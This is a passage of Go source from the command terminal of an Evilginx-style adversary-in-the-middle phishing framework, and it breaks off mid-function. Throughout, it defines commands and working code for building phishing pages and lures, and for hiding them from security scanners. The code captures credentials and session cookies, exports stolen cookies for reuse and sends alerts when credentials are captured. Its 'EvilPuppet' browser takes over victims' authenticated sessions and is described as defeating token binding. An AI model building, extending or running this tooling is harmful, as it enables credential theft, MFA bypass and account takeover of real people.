	h.AddSubCommand("phishlets", []string{"hostname"}, "hostname <phishlet> <hostname>", "set hostname for given phishlet (e.g. this.is.not.a.phishing.site.evilsite.com)")
	h.AddSubCommand("phishlets", []string{"unauth_url"}, "unauth_url <phishlet> <url>", "override global unauth_url just for this phishlet")
	h.AddSubCommand("phishlets", []string{"domain"}, "domain <phishlet> <domain>", "set a per-phishlet base domain (overrides global domain)")
	h.AddSubCommand("phishlets", []string{"proxy"}, "proxy <phishlet> <proxy_name>", "set a named proxy for this phishlet")
	h.AddSubCommand("phishlets", []string{"enable"}, "enable <phishlet>", "enables phishlet and requests ssl/tls certificate if needed")
	h.AddSubCommand("phishlets", []string{"disable"}, "disable <phishlet>", "disables phishlet")
	h.AddSubCommand("phishlets", []string{"hide"}, "hide <phishlet>", "hides the phishing page, logging and redirecting all requests to it (good for avoiding scanners when sending out phishing links)")
	h.AddSubCommand("phishlets", []string{"unhide"}, "unhide <phishlet>", "makes the phishing page available and reachable from the outside")
	h.AddSubCommand("phishlets", []string{"get-hosts"}, "get-hosts <phishlet>", "generates entries for hosts file in order to use localhost for testing")
	h.AddSubCommand("phishlets", []string{"analyze"}, "analyze <login_url>", "start recording a login flow — opens a headless browser you control via the puppet UI")
	h.AddSubCommand("phishlets", []string{"analyze", "stop"}, "analyze stop", "stop recording and generate a phishlet YAML from captured data")
	h.AddSubCommand("phishlets", []string{"analyze", "status"}, "analyze status", "show live capture stats (domains, cookies, credential fields)")

	h.AddCommand("sessions", "general", "manage sessions and captured tokens with credentials", "Shows all captured credentials and authentication tokens. Allows to view full history of visits and delete logged sessions.", LAYER_TOP,
		readline.PcItem("sessions", readline.PcItem("delete", readline.PcItem("all"))))
	h.AddSubCommand("sessions", nil, "", "show history of all logged visits and captured credentials")
	h.AddSubCommand("sessions", nil, "<id>", "show session details, including captured authentication tokens, if available")
	h.AddSubCommand("sessions", []string{"delete"}, "delete <id>", "delete logged session with <id> (ranges with separators are allowed e.g. 1-7,10-12,15-25)")
	h.AddSubCommand("sessions", []string{"delete", "all"}, "delete all", "delete all logged sessions")

	h.AddCommand("lures", "general", "manage lures for generation of phishing urls", "Shows all create lures and allows to edit or delete them.", LAYER_TOP,
		readline.PcItem("lures", readline.PcItem("create", readline.PcItemDynamic(t.phishletPrefixCompleter)), readline.PcItem("get-url"), readline.PcItem("pause"), readline.PcItem("unpause"),
			readline.PcItem("edit", readline.PcItemDynamic(t.luresIdPrefixCompleter, readline.PcItem("hostname"), readline.PcItem("path"), readline.PcItem("redirect_url"), readline.PcItem("phishlet"), readline.PcItem("info"), readline.PcItem("og_title"), readline.PcItem("og_desc"), readline.PcItem("og_image"), readline.PcItem("og_url"), readline.PcItem("params"), readline.PcItem("ua_filter"), readline.PcItem("redirector", readline.PcItemDynamic(t.redirectorsPrefixCompleter)), readline.PcItem("proxy"))),
			readline.PcItem("delete", readline.PcItem("all"))))

	h.AddSubCommand("lures", nil, "", "show all create lures")
	h.AddSubCommand("lures", nil, "<id>", "show details of a lure with a given <id>")
	h.AddSubCommand("lures", []string{"create"}, "create <phishlet>", "creates new lure for given <phishlet>")
	h.AddSubCommand("lures", []string{"delete"}, "delete <id>", "deletes lure with given <id>")
	h.AddSubCommand("lures", []string{"delete", "all"}, "delete all", "deletes all created lures")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> <key1=value1> <key2=value2>", "generates a phishing url for a lure with a given <id>, with optional parameters")
	h.AddSubCommand("lures", []string{"get-url"}, "get-url <id> import <params_file> export <urls_file> <text|csv|json>", "generates phishing urls, importing parameters from <import_path> file and exporting them to <export_path>")
	h.AddSubCommand("lures", []string{"pause"}, "pause <id> <1d2h3m4s>", "pause lure <id> for specific amount of time and redirect visitors to `unauth_url`")
	h.AddSubCommand("lures", []string{"unpause"}, "unpause <id>", "unpause lure <id> and make it available again")
	h.AddSubCommand("lures", []string{"edit", "hostname"}, "edit <id> hostname <hostname>", "sets custom phishing <hostname> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "path"}, "edit <id> path <path>", "sets custom url <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "redirector"}, "edit <id> redirector <path>", "sets an html redirector directory <path> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "ua_filter"}, "edit <id> ua_filter <regexp>", "sets a regular expression user-agent whitelist filter <regexp> for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "redirect_url"}, "edit <id> redirect_url <redirect_url>", "sets redirect url that user will be navigated to on successful authorization, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "phishlet"}, "edit <id> phishlet <phishlet>", "change the phishlet, the lure with a given <id> applies to")
	h.AddSubCommand("lures", []string{"edit", "info"}, "edit <id> info <info>", "set personal information to describe a lure with a given <id> (display only)")
	h.AddSubCommand("lures", []string{"edit", "og_title"}, "edit <id> og_title <title>", "sets opengraph title that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_desc"}, "edit <id> og_des <title>", "sets opengraph description that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_image"}, "edit <id> og_image <title>", "sets opengraph image url that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "og_url"}, "edit <id> og_url <title>", "sets opengraph url that will be shown in link preview, for a lure with a given <id>")
	h.AddSubCommand("lures", []string{"edit", "proxy"}, "edit <id> proxy <proxy_name>", "assign a named proxy to a lure with a given <id>")

	h.AddCommand("blacklist", "general", "manage automatic blacklisting of requesting ip addresses", "Select what kind of requests should result in requesting IP addresses to be blacklisted.", LAYER_TOP,
		readline.PcItem("blacklist", readline.PcItem("all"), readline.PcItem("unauth"), readline.PcItem("noadd"), readline.PcItem("off"), readline.PcItem("log", readline.PcItem("on"), readline.PcItem("off"))))

	h.AddSubCommand("blacklist", nil, "", "show current blacklisting mode")
	h.AddSubCommand("blacklist", []string{"all"}, "all", "block and blacklist ip addresses for every single request (even authorized ones!)")
	h.AddSubCommand("blacklist", []string{"unauth"}, "unauth", "block and blacklist ip addresses only for unauthorized requests")
	h.AddSubCommand("blacklist", []string{"noadd"}, "noadd", "block but do not add new ip addresses to blacklist")
	h.AddSubCommand("blacklist", []string{"off"}, "off", "ignore blacklist and allow every request to go through")
	h.AddSubCommand("blacklist", []string{"log"}, "log <on|off>", "enable or disable log output for blacklist messages")

	h.AddCommand("notify", "general", "manage event notifications", "Configure real-time alerts when lures are clicked, credentials captured, or sessions captured.\n\n  Quick start (Telegram - free, self-contained):\n    notify create mybot telegram\n    notify set mybot bot_token <token_from_@BotFather>\n    notify set mybot chat_id <your_chat_id>\n    notify test mybot\n\n  Quick start (Webhook):\n    notify create myhook webhook\n    notify set myhook url https://your-server.com/hook\n    notify test myhook\n\n  Required config keys per type:\n    webhook  : url\n    slack    : url (incoming webhook URL)\n    pushover : user, token\n    telegram : bot_token (from @BotFather), chat_id\n\n  Triggers: lure_clicked, credential_captured, session_captured (default: all)", LAYER_TOP,
		readline.PcItem("notify", readline.PcItem("create"), readline.PcItem("delete"), readline.PcItem("set"), readline.PcItem("triggers"), readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("test")))
	h.AddSubCommand("notify", nil, "", "list all configured notifiers and their status")
	h.AddSubCommand("notify", []string{"create"}, "create <name> <type> [triggers...]", "create a new notifier (types: webhook, slack, pushover, telegram)")
	h.AddSubCommand("notify", []string{"delete"}, "delete <name>", "delete a notifier")
	h.AddSubCommand("notify", []string{"set"}, "set <name> <key> <value>", "configure a notifier setting (e.g. notify set mybot bot_token ABC123)")
	h.AddSubCommand("notify", []string{"triggers"}, "triggers <name> <trigger1,trigger2,...>", "set which events fire this notifier (lure_clicked,credential_captured,session_captured)")
	h.AddSubCommand("notify", []string{"enable"}, "enable <name>", "enable a notifier")
	h.AddSubCommand("notify", []string{"disable"}, "disable <name>", "disable a notifier")
	h.AddSubCommand("notify", []string{"test"}, "test <name>", "send a test notification to verify configuration")

	h.AddCommand("api", "general", "manage REST API configuration", "REST API for extracting sessions, lures, phishlets, and config remotely.\n\n  Quick start:\n    api key MySecretApiKey123\n    api secret_path /s3cr3t\n    api enable\n\n  Then access:  https://<your-domain>/s3cr3t/api/sessions\n  Header:       X-Api-Key: MySecretApiKey123\n\n  Available endpoints: /sessions, /lures, /phishlets, /config", LAYER_TOP,
		readline.PcItem("api", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("key"), readline.PcItem("secret_path")))
	h.AddSubCommand("api", nil, "", "show current API configuration and status")
	h.AddSubCommand("api", []string{"enable"}, "enable", "enable the REST API (requires key and secret_path)")
	h.AddSubCommand("api", []string{"disable"}, "disable", "disable the REST API")
	h.AddSubCommand("api", []string{"key"}, "key <api_key>", "set the API authentication key (sent via X-Api-Key header)")
	h.AddSubCommand("api", []string{"secret_path"}, "secret_path <path>", "set the secret URL prefix (e.g. /s3cr3t makes API available at /s3cr3t/api/...)")

	h.AddCommand("botguard", "general", "manage bot detection", "Blocks automated scanners, bots, and security crawlers from reaching phishing pages.\n\n  Detection methods (always active when enabled):\n    - User-Agent heuristics (blocks known bot/scanner UAs)\n    - Missing browser headers (Accept-Language, Referer)\n    - JA3 TLS fingerprint blocking (block specific TLS clients)\n\n  Optional JS challenge: shows a brief 'Verifying browser...' interstitial\n  that blocks headless browsers. Adds ~1.5s delay on first visit only.\n\n  Quick start:\n    botguard enable                     -- turn on basic bot detection\n    botguard js_challenge on             -- add JS challenge (optional)\n    botguard block_ja3 <md5_hash>        -- block a specific TLS fingerprint\n    botguard unblock_ja3 <md5_hash>      -- remove a blocked fingerprint", LAYER_TOP,
		readline.PcItem("botguard", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("on"), readline.PcItem("off"), readline.PcItem("js_challenge", readline.PcItem("on"), readline.PcItem("off")), readline.PcItem("block_ja3"), readline.PcItem("unblock_ja3")))
	h.AddSubCommand("botguard", nil, "", "show botguard status and blocked JA3 hashes")
	h.AddSubCommand("botguard", []string{"enable"}, "enable", "enable bot detection (UA checks + header checks + JA3)")
	h.AddSubCommand("botguard", []string{"disable"}, "disable", "disable all bot detection")
	h.AddSubCommand("botguard", []string{"js_challenge"}, "js_challenge <on|off>", "toggle JS challenge interstitial (blocks headless browsers, adds ~1.5s on first visit)")
	h.AddSubCommand("botguard", []string{"block_ja3"}, "block_ja3 <ja3_hash>", "block a JA3 TLS fingerprint (32-char MD5 hash)")
	h.AddSubCommand("botguard", []string{"unblock_ja3"}, "unblock_ja3 <ja3_hash>", "remove a JA3 hash from the blocked list")

	h.AddCommand("puppet", "general", "manage EvilPuppet remote browser sessions", "EvilPuppet launches a headless Chrome browser on the server, injects captured\n  session cookies, and lets you remote-control the authenticated session.\n  This defeats Token Protection (Token Binding) because the browser stays\n  on the same server that intercepted the session — no cookie export needed.\n\n  Quick start:\n    puppet launch <session_id> <target_url>   -- launch puppet browser\n    puppet list                               -- see active puppets\n    puppet url <puppet_id>                    -- get remote control URL\n    puppet kill <puppet_id>                   -- stop a puppet\n\n  Configuration:\n    puppet port <port>        -- set web UI port (default: 7777)\n    puppet password <pass>    -- set access password\n    puppet chrome <path>      -- set Chrome/Chromium executable path", LAYER_TOP,
		readline.PcItem("puppet", readline.PcItem("launch"), readline.PcItem("list"), readline.PcItem("kill", readline.PcItem("all")), readline.PcItem("url"), readline.PcItem("port"), readline.PcItem("password"), readline.PcItem("chrome")))
	h.AddSubCommand("puppet", nil, "", "list all active puppet browser sessions")
	h.AddSubCommand("puppet", []string{"launch"}, "launch <session_id> <target_url>", "launch a puppet browser for a captured session, navigating to the target URL (e.g. https://outlook.office.com)")
	h.AddSubCommand("puppet", []string{"list"}, "list", "list all active puppet browser sessions with their status")
	h.AddSubCommand("puppet", []string{"kill"}, "kill <puppet_id>", "stop and destroy a puppet browser session")
	h.AddSubCommand("puppet", []string{"kill", "all"}, "kill all", "stop all active puppet browser sessions")
	h.AddSubCommand("puppet", []string{"url"}, "url <puppet_id>", "show the remote control URL for a puppet (open in your browser)")
	h.AddSubCommand("puppet", []string{"port"}, "port <port>", "set the port for the puppet web control server (default: 7777)")
	h.AddSubCommand("puppet", []string{"password"}, "password <password>", "set the access password for the puppet web control server")
	h.AddSubCommand("puppet", []string{"chrome"}, "chrome <path>", "set the path to Chrome/Chromium executable (auto-detected if not set)")

	h.AddCommand("test-certs", "general", "test TLS certificates for active phishlets", "Test availability of set up TLS certificates for active phishlets.", LAYER_TOP,
		readline.PcItem("test-certs"))

	h.AddCommand("clear", "general", "clears the screen", "Clears the screen.", LAYER_TOP,
		readline.PcItem("clear"))

	t.hlp = h
}

func (t *Terminal) cookieTokensToJSON(tokens map[string]map[string]*database.CookieToken) string {
	type Cookie struct {
		Path           string `json:"path"`
		Domain         string `json:"domain"`
		ExpirationDate int64  `json:"expirationDate"`
		Value          string `json:"value"`
		Name           string `json:"name"`
		HttpOnly       bool   `json:"httpOnly"`
		HostOnly       bool   `json:"hostOnly"`
		Secure         bool   `json:"secure"`
		Session        bool   `json:"session"`
	}

	var cookies []*Cookie
	for domain, tmap := range tokens {
		for k, v := range tmap {
			c := &Cookie{
				Path:           v.Path,
				Domain:         domain,
				ExpirationDate: time.Now().Add(365 * 24 * time.Hour).Unix(),
				Value:          v.Value,
				Name:           k,
				HttpOnly:       v.HttpOnly,
				Secure:         false,
				Session:        false,
			}
			if strings.Index(k, "__Host-") == 0 || strings.Index(k, "__Secure-") == 0 {
				c.Secure = true
			}
			if domain[:1] == "." {
				c.HostOnly = false
				// c.Domain = domain[1:] - bug support no longer needed
				// NOTE: EditThisCookie was phased out in Chrome as it did not upgrade to manifest v3. The extension had a bug that I had to support to make the exported cookies work for !hostonly cookies.
				// Use StorageAce extension from now on: https://chromewebstore.google.com/detail/storageace/cpbgcbmddckpmhfbdckeolkkhkjjmplo
			} else {
				c.HostOnly = true
			}
			if c.Path == "" {
				c.Path = "/"
			}
			cookies = append(cookies, c)
		}
	}

	json, _ := json.Marshal(cookies)
	return string(json)
}

func (t *Terminal) tokensToJSON(tokens map[string]string) string {
	var ret string
	white := color.New(color.FgHiWhite)
	for k, v := range tokens {
		ret += fmt.Sprintf("%s: %s\n", k, white.Sprint(v))
	}
	return ret
}

func (t *Terminal) checkStatus() {
	// Don't show setup guidance while the analyzer is active or just finished
	if t.analyzer != nil {
		for _, s := range t.analyzer.GetActiveSessions() {
			if s.Status == "recording" || s.Status == "done" || s.Status == "analyzing" {
				return
			}
		}
	}

	cyan := color.New(color.FgCyan)
	dgray := color.New(color.FgWhite)
	yellow := color.New(color.FgYellow)
	higreen := color.New(color.FgHiGreen)

	// Step 1: External IP
	if t.cfg.GetServerExternalIP() == "" {
		log.Warning("server external IP not set")
		log.Info("%s  %s", dgray.Sprint("step 1 →"), cyan.Sprint("config ipv4 external <your_server_ip>"))
		return
	}

	// Step 2: Domain
	if t.cfg.GetBaseDomain() == "" {
		log.Warning("server domain not set")
		log.Info("%s  %s", dgray.Sprint("step 2 →"), cyan.Sprint("config domain <yourdomain.com>"))
		log.Info("%s  make sure your domain's DNS A records point to %s", dgray.Sprint("       "), yellow.Sprint(t.cfg.GetServerExternalIP()))
		return
	}

	// Step 3: Check if any phishlets are enabled
	enabledCount := 0
	hasPhishlets := false
	for _, name := range t.cfg.GetPhishletNames() {
		hasPhishlets = true
		if t.cfg.IsSiteEnabled(name) {
			enabledCount++
		}
	}

	if !hasPhishlets {
		log.Warning("no phishlets found in phishlets directory")
		t.printGetPhishletHelp(dgray, cyan, yellow)
		return
	}

	// Check if the only phishlets are placeholders (like "example")
	hasRealPhishlet := false
	placeholderNames := map[string]bool{"example": true, "test": true, "sample": true}
	var realNames []string
	for _, name := range t.cfg.GetPhishletNames() {
		if !placeholderNames[name] {
			hasRealPhishlet = true
			realNames = append(realNames, name)
		}
	}

	if !hasRealPhishlet {
		t.printGetPhishletHelp(dgray, cyan, yellow)
		return
	}

	if enabledCount == 0 {
		nameList := strings.Join(realNames, ", ")
		log.Info("%s  %s", dgray.Sprint("step 3 →"), cyan.Sprint("phishlets enable "+realNames[0]))
		if len(realNames) > 1 {
			log.Info("%s  available: %s", dgray.Sprint("       "), yellow.Sprint(nameList))
		}
		log.Info("%s  hostname is auto-set from your domain (%s)", dgray.Sprint("       "), yellow.Sprint(t.cfg.GetBaseDomain()))
		log.Info("")
		log.Info("%s  or build a new one: %s", dgray.Sprint("       "), cyan.Sprint("phishlets analyze <login_url>"))
		return
	}

	// Step 5: Check if any lures exist
	if len(t.cfg.lures) == 0 {
		enabledName := ""
		for _, name := range t.cfg.GetPhishletNames() {
			if t.cfg.IsSiteEnabled(name) {
				enabledName = name
				break
			}
		}
		log.Info("%s  %s", dgray.Sprint("step 5 →"), cyan.Sprint("lures create "+enabledName))
		log.Info("%s  then: %s", dgray.Sprint("       "), cyan.Sprint("lures get-url 0"))
		return
	}

	// Step 6: Check for captured sessions
	sessions, err := t.db.ListSessions()
	capturedCount := 0
	if err == nil {
		for _, s := range sessions {
			if len(s.CookieTokens) > 0 || len(s.BodyTokens) > 0 || len(s.HttpTokens) > 0 {
				capturedCount++
			}
		}
	}

	// All set — show a brief status summary
	log.Info("%s  %s phishlet(s) active, %s lure(s), %s session(s) captured",
		higreen.Sprint("✓ ready"),
		cyan.Sprint(strconv.Itoa(enabledCount)),
		cyan.Sprint(strconv.Itoa(len(t.cfg.lures))),
		cyan.Sprint(strconv.Itoa(capturedCount)))

	if capturedCount > 0 && t.puppet != nil {
		log.Info("%s  use %s to view sessions, %s to take over",
			dgray.Sprint("       "),
			cyan.Sprint("sessions"),
			cyan.Sprint("puppet launch <session_id> <url>"))
	}
}

func (t *Terminal) printGetPhishletHelp(dgray, cyan, yellow *color.Color) {
	higreen := color.New(color.FgHiGreen)
	log.Info("%s  you need a phishlet to target a login page", dgray.Sprint("step 3 →"))
	log.Info("")
	log.Info("%s  %s  %s", dgray.Sprint("       "), higreen.Sprint("option A:"), cyan.Sprint("build one automatically with the login flow analyzer"))
	log.Info("%s             %s", dgray.Sprint("       "), cyan.Sprint("phishlets analyze https://login.example.com"))
	log.Info("%s             interact with the login page via the puppet UI, then:", dgray.Sprint("       "))
	log.Info("%s             %s", dgray.Sprint("       "), cyan.Sprint("phishlets analyze stop"))
	log.Info("")
	log.Info("%s  %s  %s", dgray.Sprint("       "), higreen.Sprint("option B:"), cyan.Sprint("copy a phishlet YAML to this server"))
	log.Info("%s             %s", dgray.Sprint("       "), cyan.Sprint("scp myphishlet.yaml root@<server>:/opt/evilginx/phishlets/"))
	log.Info("%s             then restart evilginx to load it", dgray.Sprint("       "))
	log.Info("")
	log.Info("%s  community phishlets: %s", dgray.Sprint("       "), cyan.Sprint("https://github.com/An0nUD4Y/Evilginx2-Phishlets"))
}

func (t *Terminal) manageCertificates(verbose bool) {
	if !t.p.developer {
		if t.cfg.IsAutocertEnabled() {
			hosts := t.p.cfg.GetActiveHostnames("")
			//wc_host := t.p.cfg.GetWildcardHostname()
			//hosts := []string{wc_host}
			//hosts = append(hosts, t.p.cfg.GetActiveHostnames("")...)
			if verbose {
				log.Info("obtaining and setting up %d TLS certificates - please wait up to 60 seconds...", len(hosts))
			}
			err := t.p.crt_db.setManagedSync(hosts, 60*time.Second)
			if err != nil {
				log.Error("failed to set up TLS certificates: %s", err)
				log.Error("run 'test-certs' command to retry")
				return
			}
			if verbose {
				log.Info("successfully set up all TLS certificates")
			}
		} else {
			err := t.p.crt_db.setUnmanagedSync(verbose)
			if err != nil {
				log.Error("failed to set up TLS certificates: %s", err)
				log.Error("run 'test-certs' command to retry")
				return
			}
		}
	}
}

func (t *Terminal) sprintPhishletStatus(site string) string {
	higreen := color.New(color.FgHiGreen)
	logreen := color.New(color.FgGreen)
	hiblue := color.New(color.FgHiBlue)
	blue := color.New(color.FgBlue)
	cyan := color.New(color.FgHiCyan)
	yellow := color.New(color.FgYellow)
	higray := color.New(color.FgWhite)
	logray := color.New(color.FgHiBlack)
	n := 0
	cols := []string{"phishlet", "status", "visibility", "hostname", "domain", "proxy", "unauth_url"}
	var rows [][]string

	var pnames []string
	for s := range t.cfg.phishlets {
		pnames = append(pnames, s)
	}
	sort.Strings(pnames)

	for _, s := range pnames {
		pl := t.cfg.phishlets[s]
		if site == "" || s == site {
			_, err := t.cfg.GetPhishlet(s)
			if err != nil {
				continue
			}

			status := logray.Sprint("disabled")
			if pl.isTemplate {
				status = yellow.Sprint("template")
			} else if t.cfg.IsSiteEnabled(s) {
				status = higreen.Sprint("enabled")
			}
			hidden_status := higray.Sprint("visible")
			if t.cfg.IsSiteHidden(s) {
				hidden_status = logray.Sprint("hidden")
			}
			domain, _ := t.cfg.GetSiteDomain(s)
			unauth_url, _ := t.cfg.GetSiteUnauthUrl(s)
			phishlet_domain := t.cfg.PhishletConfig(s).Domain
			phishlet_proxy := t.cfg.PhishletConfig(s).Proxy
			n += 1

			if s == site {
				var param_names string
				for k, v := range pl.customParams {
					if len(param_names) > 0 {
						param_names += "; "
					}
					param_names += k
					if v != "" {
						param_names += ": " + v
					}
				}

				keys := []string{"phishlet", "parent", "status", "visibility", "hostname", "domain", "proxy", "unauth_url", "params"}
				vals := []string{hiblue.Sprint(s), blue.Sprint(pl.ParentName), status, hidden_status, cyan.Sprint(domain), cyan.Sprint(phishlet_domain), logray.Sprint(phishlet_proxy), logreen.Sprint(unauth_url), logray.Sprint(param_names)}
				return AsRows(keys, vals)
			} else if site == "" {
				rows = append(rows, []string{hiblue.Sprint(s), status, hidden_status, cyan.Sprint(domain), cyan.Sprint(phishlet_domain), logray.Sprint(phishlet_proxy), logreen.Sprint(unauth_url)})
			}
		}
	}
	return AsTable(cols, rows)
}

func (t *Terminal) sprintIsEnabled(enabled bool) string {
	logray := color.New(color.FgHiBlack)
	normal := color.New(color.Reset)

	if enabled {
		return normal.Sprint("true")
	} else {
		return logray.Sprint("false")
	}
}

func (t *Terminal) sprintLures() string {
	higreen := color.New(color.FgHiGreen)
	hiblue := color.New(color.FgHiBlue)
	yellow := color.New(color.FgYellow)
	cyan := color.New(color.FgCyan)
	hcyan := color.New(color.FgHiCyan)
	white := color.New(color.FgHiWhite)
	//n := 0
	cols := []string{"id", "phishlet", "hostname", "path", "redirector", "redirect_url", "proxy", "paused", "og"}
	var rows [][]string
	for n, l := range t.cfg.lures {
		var og string
		if l.OgTitle != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgDescription != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgImageUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}
		if l.OgUrl != "" {
			og += higreen.Sprint("x")
		} else {
			og += "-"
		}

		var s_paused string = higreen.Sprint(GetDurationString(time.Now(), time.Unix(l.PausedUntil, 0)))

		rows = append(rows, []string{strconv.Itoa(n), hiblue.Sprint(l.Phishlet), cyan.Sprint(l.Hostname), hcyan.Sprint(l.Path), white.Sprint(l.Redirector), yellow.Sprint(l.RedirectUrl), white.Sprint(l.Proxy), s_paused, og})
	}
	return AsTable(cols, rows)
}

func (t *Terminal) phishletPrefixCompleter(args string) []string {
	return t.cfg.GetPhishletNames()
}

func (t *Terminal) redirectorsPrefixCompleter(args string) []string {
	dir := t.cfg.GetRedirectorsDir()

	files, err := ioutil.ReadDir(dir)
	if err != nil {
		return []string{}
	}
	var ret []string
	for _, f := range files {
		if f.IsDir() {
			index_path1 := filepath.Join(dir, f.Name(), "index.html")
			index_path2 := filepath.Join(dir, f.Name(), "index.htm")
			index_found := ""
			if _, err := os.Stat(index_path1); !os.IsNotExist(err) {
				index_found = index_path1
			} else if _, err := os.Stat(index_path2); !os.IsNotExist(err) {
				index_found = index_path2
			}
			if index_found != "" {
				name := f.Name()
				if strings.Contains(name, " ") {
					name = "\"" + name + "\""
				}
				ret = append(ret, name)
			}
		}
	}
	return ret
}

func (t *Terminal) luresIdPrefixCompleter(args string) []string {
	var ret []string
	for n := range t.cfg.lures {
		ret = append(ret, strconv.Itoa(n))
	}
	return ret
}

func (t *Terminal) importParamsFromFile(base_url string, path string) ([]string, []map[string]string, error) {
	var ret []string
	var ret_params []map[string]string

	f, err := os.OpenFile(path, os.O_RDONLY, 0644)
	if err != nil {
		return ret, ret_params, err
	}
	defer f.Close()

	var format string = "text"
	if filepath.Ext(path) == ".csv" {
		format = "csv"
	} else if filepath.Ext(path) == ".json" {
		format = "json"
	}

	log.Info("importing parameters file as: %s", format)

	switch format {
	case "text":
		fs := bufio.NewScanner(f)
		fs.Split(bufio.ScanLines)

		n := 0
		for fs.Scan() {
			n += 1
			l := fs.Text()
			// remove comments
			if n := strings.Index(l, ";"); n > -1 {
				l = l[:n]
			}
			l = strings.Trim(l, " ")

			if len(l) > 0 {
				args, err := parser.Parse(l)
				if err != nil {
					log.Error("syntax error at line %d: [%s] %v", n, l, err)
					continue
				}

				params := url.Values{}
				map_params := make(map[string]string)
				for _, val := range args {
					sp := strings.Index(val, "=")
					if sp == -1 {
						log.Error("invalid parameter syntax at line %d: [%s]", n, val)
						continue
					}
					k := val[:sp]
					v := val[sp+1:]

					params.Add(k, v)
					map_params[k] = v
				}

				if len(params) > 0 {
					ret = append(ret, t.createPhishUrl(base_url, &params))
					ret_params = append(ret_params, map_params)
				}
			}
		}
	case "csv":
		r := csv.NewReader(bufio.NewReader(f))

		param_names, err := r.Read()
		if err != nil {
			return ret, ret_params, err
		}

		var params []string
		for params, err = r.Read(); err == nil; params, err = r.Read() {
			if len(params) != len(param_names) {
				log.Error("number of csv values do not match number of keys: %v", params)
				continue
			}

			item := url.Values{}
			map_params := make(map[string]string)
			for n, param := range params {
				item.Add(param_names[n], param)
				map_params[param_names[n]] = param
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}
		if err != io.EOF {
			return ret, ret_params, err
		}
	case "json":
		data, err := ioutil.ReadAll(bufio.NewReader(f))
		if err != nil {
			return ret, ret_params, err
		}

		var params_json []map[string]interface{}

		err = json.Unmarshal(data, &params_json)
		if err != nil {
			return ret, ret_params, err
		}

		for _, json_params := range params_json {
			item := url.Values{}
			map_params := make(map[string]string)
			for k, v := range json_params {
				if val, ok := v.(string); ok {
					item.Add(k, val)
					map_params[k] = val
				} else {
					log.Error("json parameter '%s' value must be of type string", k)
				}
			}
			if len(item) > 0 {
				ret = append(ret, t.createPhishUrl(base_url, &item))
				ret_params = append(ret_params, map_params)
			}
		}

		/*
			r := json.NewDecoder(bufio.NewReader(f))

			t, err := r.Token()
			if err != nil {
				return ret, ret_params, err
			}
			if s, ok := t.(string); ok && s == "[" {
				for r.More() {
					t, err := r.Token()
					if err != nil {
						return ret, ret_params, err
					}

					if s, ok := t.(string); ok && s == "{" {
						for r.More() {
							t, err := r.Token()
							if err != nil {
								return ret, ret_params, err
							}


						}
					}
				}
			} else {
				return ret, ret_params, fmt.Errorf("array of parameters not found")
			}*/
	}
	return ret, ret_params, nil
}

func (t *Terminal) exportPhishUrls(export_path string, phish_urls []string, phish_params []map[string]string, format string) error {
	if len(phish_urls) != len(phish_params) {
		return fmt.Errorf("phishing urls and phishing parameters count do not match")
	}
	if !stringExists(format, []string{"text", "csv", "json"}) {
		return fmt.Errorf("export format can only be 'text', 'csv' or 'json'")
	}

	f, err := os.OpenFile(export_path, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer f.Close()

	if format == "text" {
		for n, phish_url := range phish_urls {
			var params string
			m := 0
			params_row := phish_params[n]
			for k, v := range params_row {
				if m > 0 {
					params += " "
				}
				params += fmt.Sprintf("%s=\"%s\"", k, v)
				m += 1
			}

			_, err := f.WriteString(phish_url + " ; " + params + "\n")
			if err != nil {
				return err
			}
		}
	} else if format == "csv" {
		var data [][]string

		w := csv.NewWriter(bufio.NewWriter(f))

		var cols []string
		var param_names []string
		cols = append(cols, "url")
		for _, params_row := range phish_params {
			for k := range params_row {
				if !stringExists(k, param_names) {
					cols = append(cols, k)
					param_names = append(param_names, k)
				}
			}
		}
		data = append(data, cols)

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			var vals []string
			vals = append(vals, phish_url)

			for _, k := range param_names {
				vals = append(vals, params[k])
			}

			data = append(data, vals)
		}

		err := w.WriteAll(data)
		if err != nil {
			return err
		}
	} else if format == "json" {
		type UrlItem struct {
			PhishUrl string            `json:"url"`
			Params   map[string]string `json:"params"`
		}

		var items []UrlItem

		for n, phish_url := range phish_urls {
			params := phish_params[n]

			item := UrlItem{
				PhishUrl: phish_url,
				Params:   params,
			}

			items = append(items, item)
		}

		data, err := json.MarshalIndent(items, "", "\t")
		if err != nil {
			return err
		}

		_, err = f.WriteString(string(data))
		if err != nil {
			return err
		}
	}

	return nil
}

func (t *Terminal) createPhishUrl(base_url string, params *url.Values) string {
	var ret string = base_url
	if len(*params) > 0 {
		key_arg := strings.ToLower(GenRandomString(rand.Intn(3) + 1))

		// Check if AES-256 encryption key is configured
		aes_key := t.cfg.GetEncKey()
		if aes_key != "" && len(aes_key) >= 32 {
			// AES-256-GCM encryption (version 0x02)
			dec_params := params.Encode()
			enc_data, err := aesGcmEncrypt([]byte(aes_key[:32]), []byte(dec_params))
			if err != nil {
				log.Error("aes encryption failed: %v", err)
			} else {
				// Prepend version byte
				versioned := append([]byte{0x02}, enc_data...)
				key_val := base64.RawURLEncoding.EncodeToString(versioned)
				ret += "?" + key_arg + "=" + key_val
				return ret
			}
		}

		// Fallback: RC4 encryption (legacy, version 0x01)
		enc_key := GenRandomAlphanumString(8)
		dec_params := params.Encode()

		var crc byte
		for _, c := range dec_params {
			crc += byte(c)
		}

		c, _ := rc4.NewCipher([]byte(enc_key))
